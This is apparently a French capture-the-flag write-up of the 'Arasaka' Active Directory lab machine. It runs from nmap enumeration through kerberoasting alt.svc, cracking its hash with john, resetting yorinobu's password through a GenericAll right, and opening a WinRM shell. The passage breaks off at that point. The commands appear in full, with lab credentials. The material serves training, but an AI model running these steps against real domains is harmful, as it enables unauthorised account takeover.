---
title: Arasaka
date: 2026-03-25 17:28:41
categories: ["Machines", "Hacksmarter"]
tags: ["Easy", "Medium", "Active Directory", "ESC1", "Shadow Credentials", "Kerberoasting", "GenericAll", "GenericWrite"]
image: arasaka.png
comments: false
---


# Énumération
## Nmap

Je commence l'énumération avec un scan nmap TCP complet avec les options suivantes :
- `-vv` : pour afficher les ports ouverts au fur et à mesure qu'il sont trouvés.
- `-sV` : pour afficher la version des services.
- `-sC` : pour exécuter les scripts par défaut sur les ports ouverts.
- `-p-` : pour scanner tous les ports TCP.
- `-oN fulltcpscan.txt` : pour enregistrer le résultat dans un fichier.
```js
nmap 10.1.252.123 -p- -sC -sV -vv -Pn -oN fulltcpscan.txt
```

Plusieurs ports sont ouverts : DNS (53), LDAP (389), SMB (445), RDP (3389), WINRM (5985),...
```js
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae91340b0a816fc04205560a2c96fed
| SHA-1: affed211372065b41ee7d8da1a5868255903d150
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITaQAAAAKagDtAHp3yxQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGzAZBgoJkiaJk/IsZAEZFgtoYWNr
| c21hcnRlcjEcMBoGA1UEAxMTaGFja3NtYXJ0ZXItREMwMS1DQTAeFw0yNTA5MjEx
| NTM1MzJaFw0yNjA5MjExNTM1MzJaMCExHzAdBgNVBAMTFkRDMDEuaGFja3NtYXJ0
| ZXIubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqDW/SJXAz
| Ddx68GcSIlBSBdvsZHyWeOYnEQhJjNRF3q9Pyxwp4t4ZeZK73nUUHqP1aoBVtEqO
| OUst+2/FvdDngsk0c49Q5kINx+Yn0HK19YiXuWKO7ETECJT6NwEkCtGtTDDakZfb
| FLNxouqO8wdcEJoWs08LQ/XOYsCwTXzgW27H+tfoeQJorpJNAVSAVLkVRz/gFZPG
| 1sCAwSNp71M59lbd9lIfB35J9277o7nlWhL1IIIblta03ZBqOCwdkS1VAVQq79Ez
| 4QLo6Qr5+KWoez8o0JfUgSD4FVBUijCb0ykG4R6SUY9xhyJ/9+99+qMr91h95lcf
| Wij3bwoPoPexAgMBAAGjggNYMIIDVDAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEA
| aQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsG
| AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3
| DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQB
| LTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMH
| MB0GA1UdDgQWBBQjNx2E47Wj0bOIuLKgxvuAi3NOyDAfBgNVHSMEGDAWgBRyXthk
| ONN3zJPSEEp+rHeXhgFBMTCB1AYDVR0fBIHMMIHJMIHGoIHDoIHAhoG9bGRhcDov
| Ly9DTj1oYWNrc21hcnRlci1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
| BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPWhhY2tzbWFydGVy
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQPs7PEBOOh0WTDf6YzjqV
| BYIWREMwMS5oYWNrc21hcnRlci5sb2NhbDBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMzE1NDQxMzQ3MC0zMzQwNzM3MDI2LTI3NDg3
| MjU3OTktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiiYzJgWuS8DqZxCorudnGaA0
| p/Gh7qIeLCqjQChn/aq5C243ScVXbFTzu7IqMofJ/4J0mcX34p0PpeQIeaWokR1q
| TC7HqzkRrr9X4p4DptmRovcIbWN8kmbZ9LvQXP5QmjGDD47Oowj7FkBjQ1aVwBhi
| bMEe65ZITORVV5MDPtF+uD6NkMPhk7UxH2r521CuXJAqE+qKdayWxsRsZ94BCRw0
| OWk1T1jtHX1knkEBOv90Kfg5M/VjRgsd4Ut/H64w74ivOliQKlCAIjNdw36tM/T5
| YMVaKwjxTW7/x6NoHlWFB69E0C7CpKgkpcE494hH/Gga5/5Jzxm3x1+KuSjeiA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae91340b0a816fc04205560a2c96fed
| SHA-1: affed211372065b41ee7d8da1a5868255903d150
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITaQAAAAKagDtAHp3yxQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGzAZBgoJkiaJk/IsZAEZFgtoYWNr
| c21hcnRlcjEcMBoGA1UEAxMTaGFja3NtYXJ0ZXItREMwMS1DQTAeFw0yNTA5MjEx
| NTM1MzJaFw0yNjA5MjExNTM1MzJaMCExHzAdBgNVBAMTFkRDMDEuaGFja3NtYXJ0
| ZXIubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqDW/SJXAz
| Ddx68GcSIlBSBdvsZHyWeOYnEQhJjNRF3q9Pyxwp4t4ZeZK73nUUHqP1aoBVtEqO
| OUst+2/FvdDngsk0c49Q5kINx+Yn0HK19YiXuWKO7ETECJT6NwEkCtGtTDDakZfb
| FLNxouqO8wdcEJoWs08LQ/XOYsCwTXzgW27H+tfoeQJorpJNAVSAVLkVRz/gFZPG
| 1sCAwSNp71M59lbd9lIfB35J9277o7nlWhL1IIIblta03ZBqOCwdkS1VAVQq79Ez
| 4QLo6Qr5+KWoez8o0JfUgSD4FVBUijCb0ykG4R6SUY9xhyJ/9+99+qMr91h95lcf
| Wij3bwoPoPexAgMBAAGjggNYMIIDVDAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEA
| aQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsG
| AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3
| DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQB
| LTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMH
| MB0GA1UdDgQWBBQjNx2E47Wj0bOIuLKgxvuAi3NOyDAfBgNVHSMEGDAWgBRyXthk
| ONN3zJPSEEp+rHeXhgFBMTCB1AYDVR0fBIHMMIHJMIHGoIHDoIHAhoG9bGRhcDov
| Ly9DTj1oYWNrc21hcnRlci1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
| BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPWhhY2tzbWFydGVy
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQPs7PEBOOh0WTDf6YzjqV
| BYIWREMwMS5oYWNrc21hcnRlci5sb2NhbDBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMzE1NDQxMzQ3MC0zMzQwNzM3MDI2LTI3NDg3
| MjU3OTktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiiYzJgWuS8DqZxCorudnGaA0
| p/Gh7qIeLCqjQChn/aq5C243ScVXbFTzu7IqMofJ/4J0mcX34p0PpeQIeaWokR1q
| TC7HqzkRrr9X4p4DptmRovcIbWN8kmbZ9LvQXP5QmjGDD47Oowj7FkBjQ1aVwBhi
| bMEe65ZITORVV5MDPtF+uD6NkMPhk7UxH2r521CuXJAqE+qKdayWxsRsZ94BCRw0
| OWk1T1jtHX1knkEBOv90Kfg5M/VjRgsd4Ut/H64w74ivOliQKlCAIjNdw36tM/T5
| YMVaKwjxTW7/x6NoHlWFB69E0C7CpKgkpcE494hH/Gga5/5Jzxm3x1+KuSjeiA==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae91340b0a816fc04205560a2c96fed
| SHA-1: affed211372065b41ee7d8da1a5868255903d150
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITaQAAAAKagDtAHp3yxQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGzAZBgoJkiaJk/IsZAEZFgtoYWNr
| c21hcnRlcjEcMBoGA1UEAxMTaGFja3NtYXJ0ZXItREMwMS1DQTAeFw0yNTA5MjEx
| NTM1MzJaFw0yNjA5MjExNTM1MzJaMCExHzAdBgNVBAMTFkRDMDEuaGFja3NtYXJ0
| ZXIubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqDW/SJXAz
| Ddx68GcSIlBSBdvsZHyWeOYnEQhJjNRF3q9Pyxwp4t4ZeZK73nUUHqP1aoBVtEqO
| OUst+2/FvdDngsk0c49Q5kINx+Yn0HK19YiXuWKO7ETECJT6NwEkCtGtTDDakZfb
| FLNxouqO8wdcEJoWs08LQ/XOYsCwTXzgW27H+tfoeQJorpJNAVSAVLkVRz/gFZPG
| 1sCAwSNp71M59lbd9lIfB35J9277o7nlWhL1IIIblta03ZBqOCwdkS1VAVQq79Ez
| 4QLo6Qr5+KWoez8o0JfUgSD4FVBUijCb0ykG4R6SUY9xhyJ/9+99+qMr91h95lcf
| Wij3bwoPoPexAgMBAAGjggNYMIIDVDAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEA
| aQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsG
| AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3
| DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQB
| LTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMH
| MB0GA1UdDgQWBBQjNx2E47Wj0bOIuLKgxvuAi3NOyDAfBgNVHSMEGDAWgBRyXthk
| ONN3zJPSEEp+rHeXhgFBMTCB1AYDVR0fBIHMMIHJMIHGoIHDoIHAhoG9bGRhcDov
| Ly9DTj1oYWNrc21hcnRlci1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
| BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPWhhY2tzbWFydGVy
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQPs7PEBOOh0WTDf6YzjqV
| BYIWREMwMS5oYWNrc21hcnRlci5sb2NhbDBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMzE1NDQxMzQ3MC0zMzQwNzM3MDI2LTI3NDg3
| MjU3OTktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiiYzJgWuS8DqZxCorudnGaA0
| p/Gh7qIeLCqjQChn/aq5C243ScVXbFTzu7IqMofJ/4J0mcX34p0PpeQIeaWokR1q
| TC7HqzkRrr9X4p4DptmRovcIbWN8kmbZ9LvQXP5QmjGDD47Oowj7FkBjQ1aVwBhi
| bMEe65ZITORVV5MDPtF+uD6NkMPhk7UxH2r521CuXJAqE+qKdayWxsRsZ94BCRw0
| OWk1T1jtHX1knkEBOv90Kfg5M/VjRgsd4Ut/H64w74ivOliQKlCAIjNdw36tM/T5
| YMVaKwjxTW7/x6NoHlWFB69E0C7CpKgkpcE494hH/Gga5/5Jzxm3x1+KuSjeiA==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.hacksmarter.local
| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-21T15:35:32
| Not valid after:  2026-09-21T15:35:32
| MD5:   fae91340b0a816fc04205560a2c96fed
| SHA-1: affed211372065b41ee7d8da1a5868255903d150
| -----BEGIN CERTIFICATE-----
| MIIGWjCCBUKgAwIBAgITaQAAAAKagDtAHp3yxQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGzAZBgoJkiaJk/IsZAEZFgtoYWNr
| c21hcnRlcjEcMBoGA1UEAxMTaGFja3NtYXJ0ZXItREMwMS1DQTAeFw0yNTA5MjEx
| NTM1MzJaFw0yNjA5MjExNTM1MzJaMCExHzAdBgNVBAMTFkRDMDEuaGFja3NtYXJ0
| ZXIubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDqDW/SJXAz
| Ddx68GcSIlBSBdvsZHyWeOYnEQhJjNRF3q9Pyxwp4t4ZeZK73nUUHqP1aoBVtEqO
| OUst+2/FvdDngsk0c49Q5kINx+Yn0HK19YiXuWKO7ETECJT6NwEkCtGtTDDakZfb
| FLNxouqO8wdcEJoWs08LQ/XOYsCwTXzgW27H+tfoeQJorpJNAVSAVLkVRz/gFZPG
| 1sCAwSNp71M59lbd9lIfB35J9277o7nlWhL1IIIblta03ZBqOCwdkS1VAVQq79Ez
| 4QLo6Qr5+KWoez8o0JfUgSD4FVBUijCb0ykG4R6SUY9xhyJ/9+99+qMr91h95lcf
| Wij3bwoPoPexAgMBAAGjggNYMIIDVDAvBgkrBgEEAYI3FAIEIh4gAEQAbwBtAGEA
| aQBuAEMAbwBuAHQAcgBvAGwAbABlAHIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsG
| AQUFBwMBMA4GA1UdDwEB/wQEAwIFoDB4BgkqhkiG9w0BCQ8EazBpMA4GCCqGSIb3
| DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQB
| LTALBglghkgBZQMEAQIwCwYJYIZIAWUDBAEFMAcGBSsOAwIHMAoGCCqGSIb3DQMH
| MB0GA1UdDgQWBBQjNx2E47Wj0bOIuLKgxvuAi3NOyDAfBgNVHSMEGDAWgBRyXthk
| ONN3zJPSEEp+rHeXhgFBMTCB1AYDVR0fBIHMMIHJMIHGoIHDoIHAhoG9bGRhcDov
| Ly9DTj1oYWNrc21hcnRlci1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1Ymxp
| YyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24s
| REM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlz
| dD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHLBggrBgEF
| BQcBAQSBvjCBuzCBuAYIKwYBBQUHMAKGgatsZGFwOi8vL0NOPWhhY2tzbWFydGVy
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGFja3NtYXJ0ZXIsREM9bG9jYWw/
| Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRo
| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQPs7PEBOOh0WTDf6YzjqV
| BYIWREMwMS5oYWNrc21hcnRlci5sb2NhbDBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMzE1NDQxMzQ3MC0zMzQwNzM3MDI2LTI3NDg3
| MjU3OTktMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAiiYzJgWuS8DqZxCorudnGaA0
| p/Gh7qIeLCqjQChn/aq5C243ScVXbFTzu7IqMofJ/4J0mcX34p0PpeQIeaWokR1q
| TC7HqzkRrr9X4p4DptmRovcIbWN8kmbZ9LvQXP5QmjGDD47Oowj7FkBjQ1aVwBhi
| bMEe65ZITORVV5MDPtF+uD6NkMPhk7UxH2r521CuXJAqE+qKdayWxsRsZ94BCRw0
| OWk1T1jtHX1knkEBOv90Kfg5M/VjRgsd4Ut/H64w74ivOliQKlCAIjNdw36tM/T5
| YMVaKwjxTW7/x6NoHlWFB69E0C7CpKgkpcE494hH/Gga5/5Jzxm3x1+KuSjeiA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HACKSMARTER
|   NetBIOS_Domain_Name: HACKSMARTER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|   DNS_Tree_Name: hacksmarter.local
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-25T19:46:24+00:00
|_ssl-date: 2026-03-25T19:47:03+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.hacksmarter.local
| Issuer: commonName=DC01.hacksmarter.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-24T19:34:23
| Not valid after:  2026-09-23T19:34:23
| MD5:   adb937e33d2f9bfb313f88fc229534a1
| SHA-1: 463d7b4309ec6b39e620fb26e925a19e9375161d
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQR7Y4A/mw45BBUtT1JhSv+zANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZEQzAxLmhhY2tzbWFydGVyLmxvY2FsMB4XDTI2MDMyNDE5MzQy
| M1oXDTI2MDkyMzE5MzQyM1owITEfMB0GA1UEAxMWREMwMS5oYWNrc21hcnRlci5s
| b2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOASiXXHjnXPgHQw
| phXH06jiJA3nJuwIkBM235+UiJx4QrQkl21Fv95uJ0RcRxVX4MmdyVNDo8c2dmKv
| UIWCBTREwndT6XQSWjPuDZ/OchOZC67xjv5AAIrCE+wKRP7SMbz+mvT1HzkJoUEo
| /wdYcJutKQoZnrA5Hc705R2h0Nm37c6GGHYTvLTVY0Y54kPfmPIXfdnvPIuyqKrL
| hYNLLMSfIno8hHxxAvk9PZTMHVyUCM2xapTn5PTxRp0w48+RRU8TBettlUkp2Hnl
| dn2eojlWeXq7KKKDtLGLgWzjgGOuSMqS+ymPYR0RMUqhq8cOHUdQeHlcVZ68z0BQ
| 7QdRtPECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQBTgHmUAKEDbJ+amy0Zfpm4+8090VLCtCh1wpZV
| E1wRxqc2T023IIk66X2b3V1nt0RXisYzSFPsDCBy8zBNvFNNJzWqcWx8fa6LOJ3p
| 4M1FpG4Q2bhE1bCfWlmAq+swxXANBL8tO8/OoKEKzeQ8G2bUjjwWJOHLTEOso58w
| V2u/3IFZrec4siqTvmCWaDo9jG1glPrOFiSUTuxAZDTsJGXRgJs5GX26aENCeu+G
| 98gXBArHBbqOA2ZLf4ZRskYDEu5rBnt/8/MNxoKXNq4lsuEzVItC0UjJtOA2Vh/4
| s2Yw0JCYpUmdXH77q8TmCs3hxXKaWuxT+/et98d4ERgekpA+
|_-----END CERTIFICATE-----
5357/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49683/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49789/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49803/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
60219/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63517/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Je commence par ajouter le nom de domaine ainsi que le FQDN dans le fichier `/etc/hosts`.
```js
[root@exegol-hacksmarter] /workspace/Arasaka
❯ nxc smb 10.1.252.123 --generate-hosts-file /etc/hosts
SMB         10.1.252.123    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)

[root@exegol-hacksmarter] /workspace/Arasaka
❯ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      exegol-hacksmarter
10.1.252.123     DC01.hacksmarter.local hacksmarter.local DC01
```

## SMB - TCP 445

Avec les identifiants fournis, je peux énumérer les partages SMB. Mais il n'y a rien d'intéressant dans ceux énumérés.
```js
[root@exegol-hacksmarter] /workspace/Arasaka
❯ nxc smb dc01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --shares
SMB         10.1.252.123    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.252.123    445    DC01             [+] hacksmarter.local\faraday:hacksmarter123
SMB         10.1.252.123    445    DC01             [*] Enumerated shares
SMB         10.1.252.123    445    DC01             Share           Permissions     Remark
SMB         10.1.252.123    445    DC01             -----           -----------     ------
SMB         10.1.252.123    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.252.123    445    DC01             C$                              Default share
SMB         10.1.252.123    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.252.123    445    DC01             NETLOGON        READ            Logon server share
SMB         10.1.252.123    445    DC01             SYSVOL          READ            Logon server share
```

Je récupère la liste des utilisateurs du domaine.
```js
nxc smb dc01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --users-export users.txt
```
![](/Arasaka-1.png)

Il n'y a que `faraday` qui utilise le mot de passe fourni au début.
```js
nxc smb dc01.hacksmarter.local -u users.txt -p 'hacksmarter123' --continue-on-success
```
![](/Arasaka-3.png)

## Bloodhound

J'utilise `rusthound-ce` afin de récolter les relations entre les utilisateurs du domaine.
```js
rusthound-ce -d hacksmarter.local -u faraday -p hacksmarter123
```
![](/Arasaka-2.png)

Les admins du domaine sont `THE_EMPEROR` et `ADMINISTRATOR`.
![](/Arasaka-4.png)

`alt.svc` est un utilisateur kerberoastable.
![](/Arasaka-6.png)

`alt.svc` a le droit `GenericAll` sur `yorinobu`, ce qui lui donne le contrôle total de ce dernier. 
`yorinobu` quant à lui a le droit `GenericWrite` sur `soulkiller.svc` ce qui lui permet d'écrire dans l'attribut `msds-KeyCredentialLink`. L'écriture dans cette propriété permet à un attaquant d'effectuer les attaques `shadow credentials` ou du `targeted kerberoasting`.
![](/Arasaka-5.png)

# Shell en tant que Yorinobu
## Kerberoasting sur ALT.SVC

J'utilise l'option `--kerberoast` afin de récupérer le hash de l'utilisateur `alt.svc`.
```js
nxc ldap dc01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --kerberoast kerb.txt
```
![](/Arasaka-7.png)

Je craque le hash avec john et j'obtiens le mot de passe `babygirl1`.
```js
[root@exegol-hacksmarter] /workspace/Arasaka
❯ john --wordlist=`fzf-wordlists` kerb.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
babygirl1        (?)
1g 0:00:00:00 DONE (2026-03-25 21:01) 33.33g/s 34133p/s 34133c/s 34133C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Changer le mot de passe de Yorinobu

Dans mon cas j'abuserai de droit `GenericAll` en modifiant le mot de passe de `yorinobu`.
```js
[root@exegol-hacksmarter] /workspace/Arasaka
❯ bloodyad --host dc01.hacksmarter.local -u alt.svc -p babygirl1 set password yorinobu Password123
[+] Password changed successfully!
```

## WINRM

J'obtiens un shell WINRM en tant que `yorinobu`.
```js
[root@exegol-hacksmarter] /workspace/Arasaka
❯ evil-winrm-py --ip dc01.hacksmarter.local -u yorinobu -p Password123
          _ _            _
